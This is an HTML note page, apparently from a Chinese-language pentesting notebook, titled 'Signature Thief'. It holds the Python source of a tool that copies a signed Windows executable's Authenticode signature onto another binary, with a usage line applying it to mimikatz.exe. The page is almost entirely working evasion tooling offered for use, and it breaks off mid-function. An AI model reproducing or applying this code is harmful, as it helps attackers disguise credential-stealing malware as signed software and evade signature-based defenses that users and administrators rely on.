<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>签名小偷</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>签名小偷</h1><br/>将一个文件的签名附加到另一个文件上<br />sigthief.py -i 签名文件.exe -t mimikatz.exe -o mimi.exe<br /><div class="codebox"><div class="codebox">import&nbsp;sys<br />import&nbsp;struct<br />import&nbsp;shutil<br />import&nbsp;io<br />from&nbsp;optparse&nbsp;import&nbsp;OptionParser<br />&nbsp;<br />def&nbsp;gather_file_info_win(binary):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Borrowed&nbsp;from&nbsp;BDF...<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I&nbsp;could&nbsp;just&nbsp;skip&nbsp;to&nbsp;certLOC...&nbsp;*shrug*<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms&nbsp;=&nbsp;{}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary&nbsp;=&nbsp;open(binary,&nbsp;&#39;rb&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(int(&#39;3C&#39;,&nbsp;16))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;buffer&#39;]&nbsp;=&nbsp;0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;JMPtoCodeAddress&#39;]&nbsp;=&nbsp;0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;dis_frm_pehdrs_sectble&#39;]&nbsp;=&nbsp;248<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;pe_header_location&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;i&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Start&nbsp;of&nbsp;COFF<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;COFF_Start&#39;]&nbsp;=&nbsp;flItms[&#39;pe_header_location&#39;]&nbsp;+&nbsp;4<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(flItms[&#39;COFF_Start&#39;])<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MachineType&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(flItms[&#39;COFF_Start&#39;]&nbsp;+&nbsp;2,&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;NumberOfSections&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;TimeDateStamp&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(flItms[&#39;COFF_Start&#39;]&nbsp;+&nbsp;16,&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfOptionalHeader&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;Characteristics&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#End&nbsp;of&nbsp;COFF<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;OptionalHeader_start&#39;]&nbsp;=&nbsp;flItms[&#39;COFF_Start&#39;]&nbsp;+&nbsp;20<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#if&nbsp;flItms[&#39;SizeOfOptionalHeader&#39;]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Begin&nbsp;Standard&nbsp;Fields&nbsp;section&nbsp;of&nbsp;Optional&nbsp;Header<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(flItms[&#39;OptionalHeader_start&#39;])<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;Magic&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MajorLinkerVersion&#39;]&nbsp;=&nbsp;struct.unpack(&quot;!B&quot;,&nbsp;binary.read(1))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MinorLinkerVersion&#39;]&nbsp;=&nbsp;struct.unpack(&quot;!B&quot;,&nbsp;binary.read(1))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfCode&#39;]&nbsp;=&nbsp;struct.unpack(&quot;&lt;I&quot;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfInitializedData&#39;]&nbsp;=&nbsp;struct.unpack(&quot;&lt;I&quot;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfUninitializedData&#39;]&nbsp;=&nbsp;struct.unpack(&quot;&lt;I&quot;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;AddressOfEntryPoint&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;PatchLocation&#39;]&nbsp;=&nbsp;flItms[&#39;AddressOfEntryPoint&#39;]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;BaseOfCode&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;flItms[&#39;Magic&#39;]&nbsp;!=&nbsp;0x20B:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;BaseOfData&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;End&nbsp;Standard&nbsp;Fields&nbsp;section&nbsp;of&nbsp;Optional&nbsp;Header<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Begin&nbsp;Windows-Specific&nbsp;Fields&nbsp;of&nbsp;Optional&nbsp;Header<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;flItms[&#39;Magic&#39;]&nbsp;==&nbsp;0x20B:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ImageBase&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ImageBase&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SectionAlignment&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;FileAlignment&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MajorOperatingSystemVersion&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MinorOperatingSystemVersion&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MajorImageVersion&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MinorImageVersion&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MajorSubsystemVersion&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;MinorSubsystemVersion&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;Win32VersionValue&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfImageLoc&#39;]&nbsp;=&nbsp;binary.tell()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfImage&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfHeaders&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;CheckSum&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;Subsystem&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;DllCharacteristics&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;H&#39;,&nbsp;binary.read(2))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;flItms[&#39;Magic&#39;]&nbsp;==&nbsp;0x20B:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfStackReserve&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfStackCommit&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfHeapReserve&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfHeapCommit&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfStackReserve&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfStackCommit&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfHeapReserve&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;SizeOfHeapCommit&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;LoaderFlags&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]&nbsp;&nbsp;#&nbsp;zero<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;NumberofRvaAndSizes&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;End&nbsp;Windows-Specific&nbsp;Fields&nbsp;of&nbsp;Optional&nbsp;Header<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Begin&nbsp;Data&nbsp;Directories&nbsp;of&nbsp;Optional&nbsp;Header<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ExportTableRVA&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ExportTableSize&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ImportTableLOCInPEOptHdrs&#39;]&nbsp;=&nbsp;binary.tell()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ImportTable&nbsp;SIZE|LOC<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ImportTableRVA&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ImportTableSize&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;I&#39;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ResourceTable&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;ExceptionTable&#39;]&nbsp;=&nbsp;struct.unpack(&#39;&lt;Q&#39;,&nbsp;binary.read(8))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;CertTableLOC&#39;]&nbsp;=&nbsp;binary.tell()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;CertLOC&#39;]&nbsp;=&nbsp;struct.unpack(&quot;&lt;I&quot;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flItms[&#39;CertSize&#39;]&nbsp;=&nbsp;struct.unpack(&quot;&lt;I&quot;,&nbsp;binary.read(4))[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.close()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;flItms<br />&nbsp;<br />&nbsp;<br />def&nbsp;copyCert(exe):<br />&nbsp;&nbsp;&nbsp;&nbsp;flItms&nbsp;=&nbsp;gather_file_info_win(exe)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;flItms[&#39;CertLOC&#39;]&nbsp;==&nbsp;0&nbsp;or&nbsp;flItms[&#39;CertSize&#39;]&nbsp;==&nbsp;0:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;not&nbsp;signed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Input&nbsp;file&nbsp;Not&nbsp;signed!&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(-1)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(exe,&nbsp;&#39;rb&#39;)&nbsp;as&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(flItms[&#39;CertLOC&#39;],&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cert&nbsp;=&nbsp;f.read(flItms[&#39;CertSize&#39;])<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;cert<br />&nbsp;<br />&nbsp;<br />def&nbsp;writeCert(cert,&nbsp;exe,&nbsp;output):<br />&nbsp;&nbsp;&nbsp;&nbsp;flItms&nbsp;=&nbsp;gather_file_info_win(exe)<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;output:&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;output&nbsp;=&nbsp;str(exe)&nbsp;+&nbsp;&quot;_signed&quot;<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;shutil.copy2(exe,&nbsp;output)<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Output&nbsp;file:&nbsp;{0}&quot;.format(output))<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(exe,&nbsp;&#39;rb&#39;)&nbsp;as&nbsp;g:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(output,&nbsp;&#39;wb&#39;)&nbsp;as&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(g.read())<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(flItms[&#39;CertTableLOC&#39;],&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(struct.pack(&quot;&lt;I&quot;,&nbsp;len(open(exe,&nbsp;&#39;rb&#39;).read())))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(struct.pack(&quot;&lt;I&quot;,&nbsp;len(cert)))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(0,&nbsp;io.SEEK_END)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(cert)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Signature&nbsp;appended.&nbsp;\nFIN.&quot;)<br />&nbsp;<br />&nbsp;<br />def&nbsp;outputCert(exe,&nbsp;output):<br />&nbsp;&nbsp;&nbsp;&nbsp;cert&nbsp;=&nbsp;copyCert(exe)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;output:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;str(exe)&nbsp;+&nbsp;&quot;_sig&quot;<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Output&nbsp;file:&nbsp;{0}&quot;.format(output))<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;open(output,&nbsp;&#39;wb&#39;).write(cert)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Signature&nbsp;ripped.&nbsp;\nFIN.&quot;)<br />&nbsp;<br />&nbsp;<br />def&nbsp;check_sig(exe):<br />&nbsp;&nbsp;&nbsp;&nbsp;flItms&nbsp;=&nbsp;gather_file_info_win(exe)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;flItms[&#39;CertLOC&#39;]&nbsp;==&nbsp;0&nbsp;or&nbsp;flItms[&#39;CertSize&#39;]&nbsp;==&nbsp;0:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;not&nbsp;signed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Inputfile&nbsp;Not&nbsp;signed!&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Inputfile&nbsp;is&nbsp;signed!&quot;)<br />&nbsp;<br />&nbsp;<br />def&nbsp;truncate(exe,&nbsp;output):<br />&nbsp;&nbsp;&nbsp;&nbsp;flItms&nbsp;=&nbsp;gather_file_info_win(exe)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;flItms[&#39;CertLOC&#39;]&nbsp;==&nbsp;0&nbsp;or&nbsp;flItms[&#39;CertSize&#39;]&nbsp;==&nbsp;0:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;not&nbsp;signed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Inputfile&nbsp;Not&nbsp;signed!&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(-1)<br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&nbsp;&quot;Inputfile&nbsp;is&nbsp;signed!&quot;)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;output:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;str(exe)&nbsp;+&nbsp;&quot;_nosig&quot;<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Output&nbsp;file:&nbsp;{0}&quot;.format(output))<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;shutil.copy2(exe,&nbsp;output)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(output,&nbsp;&quot;r+b&quot;)&nbsp;as&nbsp;binary:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Overwriting&nbsp;certificate&nbsp;table&nbsp;pointer&nbsp;and&nbsp;truncating&nbsp;binary&#39;)<br 